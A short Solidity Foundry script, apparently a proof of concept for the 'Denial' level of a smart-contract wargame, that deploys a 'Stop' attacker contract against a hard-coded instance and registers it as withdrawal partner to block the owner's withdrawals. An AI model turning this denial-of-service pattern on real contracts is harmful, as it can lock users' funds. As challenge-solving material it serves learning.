// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";
import {Stop} from "../src/20_Denial.sol";

contract PoC is Script {
    address private immutable denial =
        0xA5aCd27F60246ebdA0dF9E55Dd78f394715747c4; // Replace with your Denial instance

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployer);

        Stop stop = new Stop(denial);
        stop.becomePartner();

        vm.stopBroadcast();
    }
}
